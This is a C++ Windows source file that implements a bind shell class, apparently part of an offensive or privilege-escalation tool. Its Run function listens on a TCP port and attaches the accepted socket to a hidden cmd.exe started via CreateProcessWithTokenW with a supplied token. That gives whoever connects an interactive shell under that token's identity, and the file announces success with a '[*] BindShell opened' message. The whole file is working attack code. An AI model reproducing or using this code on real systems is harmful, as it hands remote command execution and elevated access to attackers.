#include <WS2tcpip.h>

#include "Bind.h"
#include <stdio.h>
#pragma comment(lib, "Ws2_32.lib")

BindShell::BindShell()
{

}

BindShell::~BindShell()
{
	WSACleanup();
}

int BindShell::Run(unsigned short port, HANDLE token)
{
	WSADATA WSAData;
	SOCKADDR_IN sin;
	SOCKET sock;

	if (!WSAStartup(MAKEWORD(2, 0), &WSAData))
	{
		sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
		sin.sin_family = AF_INET;
		sin.sin_addr.s_addr = htonl(INADDR_LOOPBACK); // INADDR_ANY
		sin.sin_port = htons(port);

		if (!bind(sock, (SOCKADDR*)&sin, sizeof(SOCKADDR_IN)))
		{
			listen(sock, SOMAXCONN);

			SOCKET tmp = accept(sock, 0, 0);
			STARTUPINFO si = { 0 };
			PROCESS_INFORMATION pi = { 0 };
			wchar_t buff[2010];

			si.cb = sizeof(si);
			si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
			si.wShowWindow = SW_HIDE;
			si.hStdOutput = (HANDLE)tmp;
			si.hStdError = (HANDLE)tmp;
			si.hStdInput = (HANDLE)tmp;

			GetEnvironmentVariable(L"COMSPEC", buff, 2000);

			bool b1 = CreateProcessWithTokenW(token,
				0,
				buff,
				NULL,
				CREATE_NEW_CONSOLE,
				NULL,
				NULL,
				&si,
				&pi);


			if (b1)
			{
				printf("[*] BindShell opened on Port %d !\n", port);
			}

			WaitForSingleObject(pi.hProcess, INFINITE);

			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);

			closesocket(tmp);
		}
	}

	return	0;
}